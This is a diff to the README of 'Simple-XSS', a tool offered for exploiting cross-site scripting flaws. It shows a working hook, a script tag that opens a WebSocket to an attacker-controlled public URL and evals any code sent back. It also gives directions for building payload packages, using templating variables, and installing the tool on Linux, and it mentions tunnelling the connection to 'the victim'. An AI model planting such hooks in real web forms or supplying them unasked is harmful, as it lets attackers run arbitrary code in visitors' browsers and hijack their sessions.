@@ -1,23 +1,27 @@
 # Simple-XSS
 
-Simple-XSS is a multiplatform XSS vulnerability exploiter.
-
-## Algorithm
+Simple-XSS is a multiplatform cross-site scripting (XSS) vulnerability exploitation tool. This application will help you
+create a hook that can easily
+and reliably catch a client by downloading a payload to their browser and executing it. You don't even need a white IP
+for this because the application will take care of tunneling the connection between you and the victim.
 
 ## Usage
 
+_To run application see [installation](#Installation) section._
+
 ### Hook
+
 > _Hooks folder: [hooks](hooks)_
 
-
-**Hook** is an HTML code that can be embedded in a vulnerable XSS form. It looks like:
+**Hook** is an HTML code snippet designed to be embedded in a vulnerable XSS form. It looks like:
 
 ```html
 
-<script>c = new WebSocket('{{environment.public_url}}'); c.onmessage = (e) => eval(e.data);</script>
+<script>c = new WebSocket('{{environment.public_url}}');
+c.onmessage = (e) => eval(e.data);</script>
 ```
 
-**NOTE:** _As you can see here is a variable: {{environment.public_url}}. You can read more about
+**NOTE:** _As you can see here is a built-in variable: {{environment.public_url}}. You can read more about
 this below._
 
 This is a [default](hooks/default) hook. When it's embedded in the vulnerable form, it downloads the JS
@@ -40,6 +44,8 @@ Hook has the following structure:
 **hook.html** - main file, contains HTML code that can be embedded in vulnerable form.
 
 **package.toml** - metadata file, contains data about hook such as name, description, author and version.
+
+_To create custom hook, follow these steps:_
 
 ### Payload
 
@@ -96,16 +102,33 @@ echo "name = 'My Payload'" > package.toml
 echo "print('Hello, World!')" > init.py
 ```
 
-### Internal-Objects
+### Templating
 
-**Internal objects** are transferred to hook & payload main files using [Jinja](https://jinja.palletsprojects.com/)
+**Inbuilt objects** is an objects passed into hook & payload main files
+using [Jinja](https://jinja.palletsprojects.com/)
 templating engine. It contains additional information that may be needed when loading a hook or payload.
 
 #### Environment
 
-
+- public_url - public address of WebSocket server
 
 #### Metadata
+
+**package** - hook or payload
+
+- **name** - name of package
+- **author** - package author
+- **version** - version of package
+- **description** - package description
+
+If you need to use some variable, just use such construction: {{object.variable}}.
+For example:
+
+```
+alert('{{metadata.name}} - V{{metadata.version}}')
+```
+
+The provided payload code snippet will display an alert dialog showcasing the name and version of the payload.
 
 ## Interface
 
@@ -147,7 +170,30 @@ And finally you can run it:
 python main.py
 ```
 
+> Use `--help` argument to get help.
+
 ### Linux
+
+First you need to clone the repository:
+
+```commandline
+git clone https://github.com/CrazyProger1/Simple-XSS
+```
+
+Then go to the folder & install requirements:
+
+```commandline
+cd Simple-XSS
+pip install -r requirements.txt
+```
+
+And finally you can run it:
+
+```commandline
+python main.py
+```
+
+> Use `--help` argument to get help.
 
 ## License
 
